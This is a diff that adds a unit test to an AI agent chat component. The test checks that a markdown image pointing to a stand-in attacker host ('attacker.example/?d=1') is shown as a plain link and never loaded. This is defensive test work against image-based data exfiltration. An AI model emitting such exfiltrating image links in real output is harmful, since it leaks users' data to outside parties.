@@ -52,6 +52,16 @@ async function render(tasks: Record<string, JoeTask>, onTaskChanged = vi.fn()) {
 }
 
 describe('JoeChatMessage', () => {
+  it('shows a remote image as a link instead of loading it', async () => {
+    await act(async () => {
+      root.render(<JoeChatMessage msg={{ type: 'joe', role: 'joe', text: 'see ![chart](https://attacker.example/?d=1)' }} fontSize={14} ctx={{ token: 'tok', agentName: 'Joe', tasks: {} }} />)
+    })
+    expect(container.querySelector('img')).toBeNull()
+    const link = container.querySelector('a[href="https://attacker.example/?d=1"]')
+    expect(link?.textContent).toBe('External image: chart (attacker.example)')
+    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
+  })
+
   it('attributes the user\'s request to Joe', async () => {
     await act(async () => {
       root.render(<JoeChatMessage msg={{ type: 'joe', role: 'to_joe', text: 'supervise this' }} fontSize={14} ctx={{ token: 'tok', agentName: 'Joe', tasks: {} }} />)
